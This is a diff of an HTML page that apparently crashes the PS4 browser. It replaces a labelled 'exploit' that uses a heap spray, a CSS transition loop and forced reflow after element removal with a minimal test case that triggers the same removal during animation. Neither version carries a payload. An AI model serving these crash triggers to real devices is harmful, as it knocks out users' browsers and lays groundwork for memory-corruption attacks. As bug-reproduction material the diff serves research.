@@ -1,74 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PS4 Full-Screen Crash (Auto-Trigger)</title>
-  <style>
-    #box { 
-      width: 100px; height: 100px; 
-      background: red; 
-      transition: transform 0.5s linear; 
-      position: absolute; 
-      left: 0; top: 50%; 
-    }
-    #status { 
-      font-family: Arial; 
-      color: white; 
-      background: black; 
-      padding: 10px; 
-      position: fixed; 
-      top: 0; 
-      left: 0; 
-      z-index: 9999; 
-    }
-  </style>
+  <title>Test</title>
 </head>
-<body style="background: #000; height: 200vh;">
-  <div id="box"></div>
-  <div id="status">CLICK TO START | AUTO-CRASH IN 3 SECONDS</div>
+<body>
 
-  <script>
-    const box = document.getElementById('box');
-    const status = document.getElementById('status');
+<div id="box" style="width:100px;height:100px;background:red;transition:all 1s"></div>
 
-    // Heap spray to increase memory pressure
-    function heapSpray() {
-      window.spray = [];
-      for (let i = 0; i < 500; i++) {
-        window.spray.push(new ArrayBuffer(0x10000));
-      }
-    }
+<script>
+  const box = document.getElementById('box');
 
-    // Force full-screen (may fail due to browser restrictions)
-    function tryFullscreen() {
-      document.documentElement.requestFullscreen().catch(e => {
-        status.textContent = "FULLSCREEN FAILED (DO IT MANUALLY)";
-      });
-    }
+  // Trigger layout
+  getComputedStyle(box).transform;
 
-    // Main exploit
-    function triggerExploit() {
-      heapSpray();
-      status.textContent = "CRASHING IN 3 SECONDS...";
+  // Start transition
+  box.style.transform = 'translateX(100px)';
 
-      // Start transition loop
-      setInterval(() => {
-        box.style.transform = 'translateX(0)';
-        setTimeout(() => box.style.transform = 'translateX(300px)', 10);
-      }, 1000);
-
-      // Schedule crash
-      setTimeout(() => {
-        tryFullscreen(); // Attempt automated fullscreen
-        setTimeout(() => {
-          box.remove();
-          document.body.offsetHeight; // Force reflow
-          status.textContent = "CRASHING NOW! (EXIT FULLSCREEN)";
-        }, 500); // Short delay before reflow
-      }, 3000); // 3-second countdown
-    }
-
-    // Start on click
-    document.body.addEventListener('click', triggerExploit);
-  </script>
+  // Remove during animation
+  setTimeout(() => {
+    box.remove();
+    // Force layout
+    document.body.offsetHeight;
+    location.href = "?css=1";
+  }, 50);
+</script>
 </body>
 </html>
